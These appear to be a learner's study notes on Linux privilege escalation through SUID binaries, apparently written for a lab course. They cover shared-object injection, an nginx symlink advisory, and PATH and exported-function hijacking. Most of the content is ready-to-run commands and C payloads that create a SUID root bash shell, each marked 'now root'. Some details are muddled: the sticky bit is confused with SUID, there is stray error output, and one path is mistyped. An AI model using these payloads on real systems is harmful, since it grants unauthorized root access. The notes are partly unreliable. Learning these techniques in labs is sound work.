SUID

* Set user id
	* has to do with setting user permissions 
	 ![de51d49c5d1471552f61c0af78537251.png](../_resources/fbf36d76de8441ca9689d78396caaa62.png)
* chmod 777 
	* r + w + x = 7 bits 
	* so chmod 777 gives full read write access to a file 
* sticky bit 
	* a s in the rw's' posistion
	* not everything with a s is vuln 
	* find them: find / -perm -u=s -type f 2>/dev/null
	* check gtfobins to see how to use the suid vuln based on what you find 
## Other SUID exploitations 
* Escliation via shared object injection
	* strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
	* strace will output a lot of binary information, like easy reverse engineering 
	* the grep finds places that the binary tries to call a file but it does not exist 
	* if you can create/edit that file then you have code exe
	* Malicious C code that backs up /bin/bash and then executes it 
		```
		#include <stdio.h>
		#include <stdlib.h>

		static void inject() __attribute__((constructor));

		void inject() {
			system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
		}
		```
* Esclication via binary symlinks
	* https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
	* if given read write access you can replcae a file with a malicious one 
	* stands for a symbolic link
	* like coding references 
	* do need a startup or restart of the nginx in this case
		* later will be chron jobs
* Esclication via enviromental variables 
	* env var - available system wide and inherted by all stuff
	* env will show env variables 
	* echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
	* gcc /tmp/service.c -o /tmp/service
	* export PATH=/tmp:$PATH
	* print $PATH
		Warning: unknown mime-type for "/tmp:/tmo:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin" -- using "application/octet-stream"
		Error: no such file "/tmp:/tmo:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin"
		
	* will not check the /tmp first before the rest of the system
	* /usr/local/bin/suid-env
	* now root
	## 2
	* function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
	* export -f /usr/sbin/service
	* /usr/local/bin/suid-env2
	* now root
	* 